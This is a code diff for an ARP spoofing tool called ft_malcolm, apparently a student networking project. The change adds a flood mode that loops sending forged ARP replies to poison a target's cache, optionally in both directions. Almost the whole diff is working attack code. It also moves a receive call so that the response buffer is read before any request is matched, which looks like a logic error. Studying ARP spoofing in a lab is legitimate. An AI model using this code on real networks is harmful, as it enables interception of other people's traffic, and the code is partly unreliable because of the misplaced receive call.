@@ -167,6 +167,7 @@ int			ft_malcolm(t_env *env)
 	while (g_stop == false && done == false)
 	{
 		recv(env->sock_fd, buf, buf_size, 0);
+		recv(env->sock_fd, resp_buf, buf_size, 0);
 		if ((((buf[12]) << 8) + buf[13]) == ETH_P_ARP)
 		{
 			arp_frame = (struct ether_arp *) (buf + 14);
@@ -182,7 +183,7 @@ int			ft_malcolm(t_env *env)
 						arp_frame->arp_tha[0], arp_frame->arp_tha[1], arp_frame->arp_tha[2], arp_frame->arp_tha[3], arp_frame->arp_tha[4], arp_frame->arp_tha[5]);
 					if (g_stop == false)
 					{
-						recv(env->sock_fd, resp_buf, buf_size, 0);
+						//recv(env->sock_fd, resp_buf, buf_size, 0);
 						if ((((resp_buf[12]) << 8) + resp_buf[13]) == ETH_P_ARP)
 						{
 							resp_arp_frame = (struct ether_arp *) (resp_buf + 14);
@@ -211,52 +212,56 @@ int			ft_malcolm(t_env *env)
 	{
 		if (init_sock(env, AF_INET, SOCK_PACKET, ETH_P_RARP))
 			return (-1);
-		printf("Sending spoofed ARP REPLY to IP %u.%u.%u.%u with IP %u.%u.%u.%u - MAC %02x:%02x:%02x:%02x:%02x:%02x\n",
-			arp_frame->arp_spa[0], arp_frame->arp_spa[1], arp_frame->arp_spa[2], arp_frame->arp_spa[3],
-			arp_frame->arp_tpa[0], arp_frame->arp_tpa[1], arp_frame->arp_tpa[2], arp_frame->arp_tpa[3],
-			env->source_mac->bytes[0], env->source_mac->bytes[1], env->source_mac->bytes[2], env->source_mac->bytes[3], env->source_mac->bytes[4], env->source_mac->bytes[5]);
-		if ((pkt = build_pkt(arp_frame->arp_tpa, arp_frame->arp_spa, env->source_mac->bytes, arp_frame->arp_sha, false)) == NULL)
+		while (1)
 		{
-			close(env->sock_fd);
-			return (-1);
-		}
-		target_addr = *(struct sockaddr*)env->target_ip;
-		ft_strcpy(target_addr.sa_data, env->iface);
-		if (sendto(env->sock_fd, pkt, sizeof(*pkt), 0, &target_addr, sizeof(target_addr)) < 0)
-		{
-			close(env->sock_fd);
-			free(pkt);
-			return (-1);
-		}
-		free(pkt);
-		if (env->bi_directional == true)
-		{
-			if (done == true)
+			printf("Sending spoofed ARP REPLY to IP %u.%u.%u.%u with IP %u.%u.%u.%u - MAC %02x:%02x:%02x:%02x:%02x:%02x\n",
+				arp_frame->arp_spa[0], arp_frame->arp_spa[1], arp_frame->arp_spa[2], arp_frame->arp_spa[3],
+				arp_frame->arp_tpa[0], arp_frame->arp_tpa[1], arp_frame->arp_tpa[2], arp_frame->arp_tpa[3],
+				env->source_mac->bytes[0], env->source_mac->bytes[1], env->source_mac->bytes[2], env->source_mac->bytes[3], env->source_mac->bytes[4], env->source_mac->bytes[5]);
+			if ((pkt = build_pkt(arp_frame->arp_tpa, arp_frame->arp_spa, env->source_mac->bytes, arp_frame->arp_sha, false)) == NULL)
 			{
-				printf("Sending spoofed ARP REPLY to IP %u.%u.%u.%u with IP %u.%u.%u.%u - MAC %02x:%02x:%02x:%02x:%02x:%02x\n",
-					arp_frame->arp_tpa[0], arp_frame->arp_tpa[1], arp_frame->arp_tpa[2], arp_frame->arp_tpa[3],
-					arp_frame->arp_spa[0], arp_frame->arp_spa[1], arp_frame->arp_spa[2], arp_frame->arp_spa[3],
-					env->source_mac->bytes[0], env->source_mac->bytes[1], env->source_mac->bytes[2], env->source_mac->bytes[3], env->source_mac->bytes[4], env->source_mac->bytes[5]);
-				if ((pkt = build_pkt(arp_frame->arp_tpa, arp_frame->arp_spa, env->source_mac->bytes, resp_arp_frame->arp_sha, true)) == NULL)
-				{
-					close(env->sock_fd);
-					return (-1);
-				}
-				target_addr = *(struct sockaddr*)env->target_ip;
-				ft_strcpy(target_addr.sa_data, env->iface);
-				if (sendto(env->sock_fd, pkt, sizeof(*pkt), 0, &target_addr, sizeof(target_addr)) < 0)
-				{
-					close(env->sock_fd);
-					free(pkt);
-					return (-1);
-				}
+				close(env->sock_fd);
+				return (-1);
+			}
+			target_addr = *(struct sockaddr*)env->target_ip;
+			ft_strcpy(target_addr.sa_data, env->iface);
+			if (sendto(env->sock_fd, pkt, sizeof(*pkt), 0, &target_addr, sizeof(target_addr)) < 0)
+			{
+				close(env->sock_fd);
 				free(pkt);
+				return (-1);
 			}
-			else
+			free(pkt);
+			if (env->bi_directional == true)
 			{
-				printf("REPLY not received. Reverse Spoofing can't be established.\n");
+				if (done == true)
+				{
+					printf("Sending spoofed ARP REPLY to IP %u.%u.%u.%u with IP %u.%u.%u.%u - MAC %02x:%02x:%02x:%02x:%02x:%02x\n",
+						arp_frame->arp_tpa[0], arp_frame->arp_tpa[1], arp_frame->arp_tpa[2], arp_frame->arp_tpa[3],
+						arp_frame->arp_spa[0], arp_frame->arp_spa[1], arp_frame->arp_spa[2], arp_frame->arp_spa[3],
+						env->source_mac->bytes[0], env->source_mac->bytes[1], env->source_mac->bytes[2], env->source_mac->bytes[3], env->source_mac->bytes[4], env->source_mac->bytes[5]);
+					if ((pkt = build_pkt(arp_frame->arp_tpa, arp_frame->arp_spa, env->source_mac->bytes, resp_arp_frame->arp_sha, true)) == NULL)
+					{
+						close(env->sock_fd);
+						return (-1);
+					}
+					target_addr = *(struct sockaddr*)env->target_ip;
+					ft_strcpy(target_addr.sa_data, env->iface);
+					if (sendto(env->sock_fd, pkt, sizeof(*pkt), 0, &target_addr, sizeof(target_addr)) < 0)
+					{
+						close(env->sock_fd);
+						free(pkt);
+						return (-1);
+					}
+					free(pkt);
+				}
+				else
+				{
+					printf("REPLY not received. Reverse Spoofing can't be established.\n");
+				}
 			}
-			
+			if (env->flood == false)
+				break;
 		}
 		close(env->sock_fd);
 		printf("Done.\n");
